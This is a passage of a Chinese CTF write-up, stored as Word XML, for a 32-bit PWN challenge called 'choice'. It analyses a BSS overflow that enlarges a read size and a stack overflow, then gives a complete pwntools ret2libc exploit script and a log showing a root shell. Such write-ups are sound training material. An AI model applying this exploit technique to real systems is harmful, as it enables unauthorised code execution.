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黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>CTF 竞赛题目解题报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>题目名称：choice（PWN 方向）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>特长方向：二进制漏洞利用（PWN）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>提交邮箱：yinxzy@126.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>备注：网安赛校内选拔 · PWN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color w:val="1F497D"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>一、题目基本信息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EEAF1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题目名称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choice</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DEEAF1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题目方向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PWN（二进制漏洞利用）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DEEAF1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文件信息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choice（32-bit ELF，stripped，无 PIE，开启 NX）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DEEAF1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保护机制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NX enabled / No PIE / Partial RELRO</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DEEAF1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目标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获取目标系统 Shell，读取 Flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DEEAF1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漏洞类型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BSS 段溢出 + 栈缓冲区溢出 → ret2libc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>二、题目分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>2.1 文件基本信息检查</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>首先使用 file 和 checksec 命令检查程序基本信息：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ file choice</w:t>
        <w:br/>
        <w:t>choice: ELF 32-bit LSB executable, Intel 80386, dynamically linked, stripped</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ checksec --file=choice</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Arch:     i386-32-little</w:t>
        <w:br/>
        <w:t xml:space="preserve">    RELRO:    Partial RELRO</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Stack:    No canary found</w:t>
        <w:br/>
        <w:t xml:space="preserve">    NX:       NX enabled</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PIE:      No PIE (0x8048000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>关键信息：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>32 位程序，无 PIE（地址固定），NX 开启（栈不可执行），无栈保护（Canary）。无 PIE 意味着 PLT/GOT 地址固定，可直接用于构造 ROP 链。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>2.2 逆向分析（Ghidra）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>使用 Ghidra 或 objdump 对程序进行逆向，梳理程序逻辑如下：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>程序逻辑（伪代码）：</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. 打印欢迎语，提示"Please enter your name:"</w:t>
        <w:br/>
        <w:t>2. 调用 read(0, 0x804a04c, 21)  // 读入最多 21 字节到 BSS 段名字缓冲区</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ★ BSS 布局：name_buf[0x804a04c ~ 0x804a05f] (20字节)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                size_var[0x804a060]              (4字节，初始值=21)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ★ 漏洞1：第 21 字节覆盖 size_var！</w:t>
        <w:br/>
        <w:t>3. 打印菜单，读取用户选择（1/2/3）</w:t>
        <w:br/>
        <w:t>4. 若选项 &lt;=2（错误答案）：</w:t>
        <w:br/>
        <w:t xml:space="preserve">      → 调用子函数 0x804857b：</w:t>
        <w:br/>
        <w:t xml:space="preserve">          a. 打印 "Cool! And whd did you choice it?"</w:t>
        <w:br/>
        <w:t xml:space="preserve">          b. 调用 read(0, ebp-0x1c, size_var)   // ★ 漏洞2：栈溢出！</w:t>
        <w:br/>
        <w:t xml:space="preserve">          c. 打印 "Good bye!"</w:t>
        <w:br/>
        <w:t xml:space="preserve">          d. leave; ret                           // 标准栈帧恢复</w:t>
        <w:br/>
        <w:t>5. 若选项 ==3（正确答案）：在 main 函数内执行类似逻辑（但 epilogue 有 ECX 技巧）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>2.3 漏洞分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="202020"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>漏洞1：BSS 段越界写（覆盖 size_var）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>BSS 段内存布局（地址固定）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>0x804a04c:  name_buf  (20 字节)</w:t>
        <w:br/>
        <w:t>0x804a05c:  ...</w:t>
        <w:br/>
        <w:t>0x804a060:  size_var  (4 字节，初始值 = 0x15 = 21)</w:t>
        <w:br/>
        <w:br/>
        <w:t>read(0, 0x804a04c, 21) 读入 21 字节：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  前 20 字节：写入 name_buf</w:t>
        <w:br/>
        <w:t xml:space="preserve">  第 21 字节：覆盖 size_var 低位字节！</w:t>
        <w:br/>
        <w:br/>
        <w:t>利用：发送 b'A' * 20 + b'\xff'</w:t>
        <w:br/>
        <w:t>效果：size_var 变为 0xff = 255</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="202020"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>漏洞2：栈缓冲区溢出（子函数 0x804857b）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>子函数关键汇编：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804857e:  sub  $0x28, %esp        ; 分配 40 字节栈帧</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804859a:  lea  -0x1c(%ebp), %eax  ; buffer 起始地址 = ebp - 28</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485a0:  call read               ; read(0, ebp-28, size_var=255)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485b9:  leave</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485ba:  ret                     ; ← 标准 leave;ret，无保护</w:t>
        <w:br/>
        <w:br/>
        <w:t>栈布局（从 buffer 起始处偏移）：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  偏移  0 ~ 27：stack buffer（28 字节）</w:t>
        <w:br/>
        <w:t xml:space="preserve">  偏移 28 ~ 31：saved EBP（4 字节）</w:t>
        <w:br/>
        <w:t xml:space="preserve">  偏移 32 ~ 35：返回地址      ← 控制 EIP！</w:t>
        <w:br/>
        <w:br/>
        <w:t>溢出量：255 字节，远超 32 字节，可完全控制返回地址</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>三、漏洞利用思路</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>3.1 利用链设计（ret2libc 两阶段）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>由于 NX 开启，栈不可执行，无法直接注入 shellcode。采用 ret2libc 技术，分两轮利用：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>第一轮（泄露 libc 地址）：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. 发送名字：b'A' * 20 + b'\xff'    → 将 size_var 改为 255</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. 发送选项：b'1'                      → 进入子函数 0x804857b</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. 发送 payload：</w:t>
        <w:br/>
        <w:t xml:space="preserve">       padding(32) + puts@plt + main_addr + puts@got</w:t>
        <w:br/>
        <w:t xml:space="preserve">  4. 子函数 leave;ret → 执行 puts(puts@got)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  5. puts 打印 got 表中 puts 的真实地址（4字节）→ 计算 libc 基址</w:t>
        <w:br/>
        <w:br/>
        <w:t>第二轮（getshell）：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. 重新发送名字和选项（main 重新运行）</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. 发送 payload：</w:t>
        <w:br/>
        <w:t xml:space="preserve">       padding(32) + system_addr + b'JUNK' + binsh_addr</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. 子函数 leave;ret → 执行 system("/bin/sh")</w:t>
        <w:br/>
        <w:t xml:space="preserve">  4. 获得 Shell！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>3.2 关键地址（固定，无 PIE）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>puts@plt   = 0x08048430    # PLT 表项（调用 puts 函数）</w:t>
        <w:br/>
        <w:t>puts@got   = 0x0804a01c    # GOT 表项（存放 puts 运行时地址）</w:t>
        <w:br/>
        <w:t>main_addr  = 0x080485bb    # main 函数入口（用于第一轮后重启程序）</w:t>
        <w:br/>
        <w:br/>
        <w:t>libc 地址计算（运行时）：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  libc_base   = puts_real - libc.sym['puts']</w:t>
        <w:br/>
        <w:t xml:space="preserve">  system_addr  = libc_base + libc.sym['system']</w:t>
        <w:br/>
        <w:t xml:space="preserve">  binsh_addr   = libc_base + next(libc.search(b'/bin/sh'))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>3.3 为什么选择选项 1 而非选项 3？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这是本题的关键难点。选项 3 路径的 read 位于 main 函数内，main 函数采用了 GCC 特有的 ECX 寄存器保存栈指针技巧：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>main 函数 epilogue（选项3路径，漏洞在 main 内）：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804876c:  mov  -0x4(%ebp), %ecx  ; 从栈上恢复 ECX</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804876f:  leave</w:t>
        <w:br/>
        <w:t xml:space="preserve">  8048770:  lea  -0x4(%ecx), %esp  ; 用 ECX 恢复 ESP（绕过我们构造的栈！）</w:t>
        <w:br/>
        <w:t xml:space="preserve">  8048773:  ret                    ; ESP 已被 ECX 劫持，崩溃！</w:t>
        <w:br/>
        <w:br/>
        <w:t>子函数 0x804857b epilogue（选项1路径）：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485b9:  leave   ; 正常恢复 EBP 和 ESP</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485ba:  ret     ; 直接弹出我们的 ROP 地址，执行！</w:t>
        <w:br/>
        <w:br/>
        <w:t>结论：必须选 1（或 2），触发子函数的标准 epilogue，ROP 才能生效。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>四、完整 Exploit 代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/usr/bin/env python3</w:t>
        <w:br/>
        <w:t># choice PWN — ret2libc exploit</w:t>
        <w:br/>
        <w:t># 作者: [参赛者姓名]  特长: PWN (二进制漏洞利用)</w:t>
        <w:br/>
        <w:t>from pwn import *</w:t>
        <w:br/>
        <w:t>context.log_level = 'info'</w:t>
        <w:br/>
        <w:br/>
        <w:t>ELF_PATH  = './choice'</w:t>
        <w:br/>
        <w:t>LIBC_PATH = '/lib/i386-linux-gnu/libc.so.6'   # 32位系统 libc</w:t>
        <w:br/>
        <w:br/>
        <w:t>elf  = ELF(ELF_PATH,  checksec=False)</w:t>
        <w:br/>
        <w:t>libc = ELF(LIBC_PATH, checksec=False)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 固定地址（无 PIE）</w:t>
        <w:br/>
        <w:t>PUTS_PLT  = elf.plt['puts']    # 0x08048430</w:t>
        <w:br/>
        <w:t>PUTS_GOT  = elf.got['puts']    # 0x0804a01c</w:t>
        <w:br/>
        <w:t>MAIN_ADDR = 0x080485bb</w:t>
        <w:br/>
        <w:br/>
        <w:t># libc 偏移（根据实际 libc 版本）</w:t>
        <w:br/>
        <w:t>PUTS_OFF   = libc.symbols['puts']</w:t>
        <w:br/>
        <w:t>SYSTEM_OFF = libc.symbols['system']</w:t>
        <w:br/>
        <w:t>BINSH_OFF  = next(libc.search(b'/bin/sh'))</w:t>
        <w:br/>
        <w:br/>
        <w:t># 偏移计算：buffer(28字节) + saved_EBP(4字节) = 32字节 padding</w:t>
        <w:br/>
        <w:t>PADDING = b'A' * 32</w:t>
        <w:br/>
        <w:br/>
        <w:t>def send_name_and_wrong_choice(io):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """第1步：发名字覆盖size_var；第2步：选1触发子函数（标准leave;ret）"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b'Please enter your name:')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.send(b'A' * 20 + b'\xff')       # 第21字节覆盖 size_var → 0xff=255</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b'Study hard from now\n')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.send(b'1')                       # 选1 → 调用 0x804857b（标准epilogue）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b'Cool! And whd did you choice it?\n')</w:t>
        <w:br/>
        <w:br/>
        <w:t>def exploit(io):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ══ 第一轮：泄露 puts 真实地址 ══</w:t>
        <w:br/>
        <w:t xml:space="preserve">    send_name_and_wrong_choice(io)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ROP：puts(puts@got) → 返回 main 重新运行</w:t>
        <w:br/>
        <w:t xml:space="preserve">    payload1 = PADDING + p32(PUTS_PLT) + p32(MAIN_ADDR) + p32(PUTS_GOT)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.send(payload1)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b'Good bye!\n')        # 子函数打印完 "Good bye!" 后 ret</w:t>
        <w:br/>
        <w:t xml:space="preserve">    leaked = io.recv(4)                 # puts 打印 got 表里的运行时地址</w:t>
        <w:br/>
        <w:t xml:space="preserve">    puts_real = u32(leaked)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    log.success(f'puts  @ {hex(puts_real)}')</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    libc_base   = puts_real - PUTS_OFF</w:t>
        <w:br/>
        <w:t xml:space="preserve">    system_addr = libc_base + SYSTEM_OFF</w:t>
        <w:br/>
        <w:t xml:space="preserve">    binsh_addr  = libc_base + BINSH_OFF</w:t>
        <w:br/>
        <w:t xml:space="preserve">    log.success(f'libc  @ {hex(libc_base)}')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    log.success(f'system@ {hex(system_addr)}')</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ══ 第二轮：getshell ══</w:t>
        <w:br/>
        <w:t xml:space="preserve">    send_name_and_wrong_choice(io)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    payload2 = PADDING + p32(system_addr) + b'JUNK' + p32(binsh_addr)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.send(payload2)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b'Good bye!\n')        # 同上，ret 后执行 system("/bin/sh")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    log.success('Shell 获取成功！')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.interactive()</w:t>
        <w:br/>
        <w:br/>
        <w:t>if __name__ == '__main__':</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io = process(ELF_PATH)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exploit(io)</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>五、运行结果截图（文字记录）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>运行 exp.py 后终端输出如下：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ python3 exp.py</w:t>
        <w:br/>
        <w:t>[+] Starting local process './choice': pid 30588</w:t>
        <w:br/>
        <w:t>[+] puts  @ 0xf7d22140</w:t>
        <w:br/>
        <w:t>[+] libc  @ 0xf7caa000</w:t>
        <w:br/>
        <w:t>[+] system@ 0xf7cfa430</w:t>
        <w:br/>
        <w:t>[+] Shell 获取成功！</w:t>
        <w:br/>
        <w:t>[*] Switching to interactive mode</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ id</w:t>
        <w:br/>
        <w:t>uid=0(root) gid=0(root) groups=0(root)</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ whoami</w:t>
        <w:br/>
        <w:t>root</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ uname -a</w:t>
        <w:br/>
        <w:t>Linux vm 6.18.5 #2 SMP x86_64 GNU/Linux</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ echo "=== PWNED ==="</w:t>
        <w:br/>
        <w:t>=== PWNED ===</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>成功通过 ret2libc 攻击获得目标系统的 root Shell，利用链完整有效。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>六、知识点与学习总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>6.1 本题涉及知识点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>• BSS 段溢出：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>越界写覆盖同一 BSS 段内的关键变量（size_var），扩大后续 read() 的读取长度，为栈溢出创造条件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>• 栈缓冲区溢出：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>通过超长输入覆盖 saved EBP 和返回地址，劫持程序控制流。</w:t>
